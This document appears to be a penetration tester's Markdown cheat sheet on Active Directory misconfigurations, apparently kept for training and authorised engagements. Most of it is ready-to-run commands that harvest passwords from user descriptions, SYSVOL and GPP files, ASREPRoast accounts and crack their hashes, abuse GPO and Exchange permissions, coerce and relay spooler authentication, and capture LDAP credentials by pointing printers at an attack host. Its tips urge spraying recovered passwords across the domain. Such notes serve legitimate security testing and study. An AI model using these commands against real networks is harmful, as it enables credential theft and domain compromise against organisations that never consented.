# Miscellaneous Misconfigurations

---

## Quick Wins to Always Check

Passwords in user Description field:

```powershell
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
```

Accounts with `PASSWD_NOTREQD` — may have blank or short password:

```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

SYSVOL scripts — hunt for hardcoded creds in `.vbs`, `.ps1`, `.bat`:

```powershell
ls \\<DC>\SYSVOL\<DOMAIN>\scripts
```

---

## GPP Passwords (MS14-025)

Patch prevents new GPP passwords but doesn't remove old `Groups.xml` files. Any domain user can read SYSVOL.

CME modules — run both:

```bash
crackmapexec smb <DC_IP> -u <USER> -p <PASS> -M gpp_password
crackmapexec smb <DC_IP> -u <USER> -p <PASS> -M gpp_autologin
```

Decrypt a cpassword value manually:

```bash
gpp-decrypt <CPASSWORD_VALUE>
```

> [!tip] GPP passwords are often for legacy/disabled accounts but always spray them internally — password reuse is common.

---

## DNS Enumeration with adidnsdump

All domain users can list DNS zone child objects. Standard LDAP queries don't return everything — adidnsdump pulls the rest. Reveals hosts that don't appear in normal enum (dev/internal servers with non-obvious names):

```bash
adidnsdump -u <DOMAIN>\\<USER> ldap://<DC_IP>
adidnsdump -u <DOMAIN>\\<USER> ldap://<DC_IP> -r
```

`-r` resolves blank `?` records via A query. Check `records.csv` for hidden IPs.

---

## ASREPRoasting

No SPN needed — requires only `DONT_REQ_PREAUTH` set on the account. No 4625 events. Hash format `$krb5asrep$23$` → hashcat mode 18200.

Enumerate vulnerable accounts:

```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol
```

Pull AS-REP ticket from Windows:

```powershell
.\Rubeus.exe asreproast /user:<USER> /nowrap /format:hashcat
```

All vulnerable users at once from Linux:

```bash
GetNPUsers.py <DOMAIN>/ -dc-ip <DC_IP> -no-pass -usersfile <USERLIST>
```

Kerbrute userenum automatically dumps AS-REP for any `DONT_REQ_PREAUTH` accounts it finds — two-for-one.

Crack offline:

```bash
hashcat -m 18200 <HASH_FILE> <WORDLIST>
```

> [!tip] If you have GenericWrite/GenericAll over a user, you can enable `DONT_REQ_PREAUTH`, ASREProast them, crack offline, then clear the attribute. Targeted ASREPRoast.

---

## GPO Abuse

Enumerate GPO names:

```powershell
Get-DomainGPO | select displayname
```

Check if a group you control has rights over any GPO:

```powershell
$sid = Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```

Resolve GPO GUID to friendly name:

```powershell
Get-GPO -Guid <GUID>
```

BloodHound: GPO node → **Affected Objects** → shows which OUs/computers are in scope for that policy. `WriteProperty`, `WriteDacl`, `WriteOwner` on a GPO = full control.

Abuse with SharpGPOAbuse — add local admin, run scheduled task, configure startup script. Scope carefully — target specific host/user, don't push to 1000 machines.

---

## Other High-Value Targets

**Exchange** — `Exchange Windows Permissions` group has WriteDACL on the domain object → DCSync. `Organization Management` = effective DA over Exchange. Dumping Exchange memory → bulk cleartext creds from OWA logins.

**Printer Bug (MS-RPRN)** — any domain user coerces spooler auth → relay to LDAP → DCSync rights or RBCD. Check for vulnerable hosts:

```powershell
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName <HOSTNAME>
```

**LDAP credential sniffing** — printers/apps storing LDAP creds in web console. Change the LDAP server IP to your attack host, set up a listener on port 389, trigger a test connection → creds sent cleartext.

**MS14-068** — forged Kerberos PAC, standard user → DA. Ancient but check for unpatched legacy hosts. HTB Mantis machine covers this.

> [!tip] Always spray any found password (GPP, Description field, SYSVOL script) across the domain — these are the highest-ROI quick wins in a real engagement.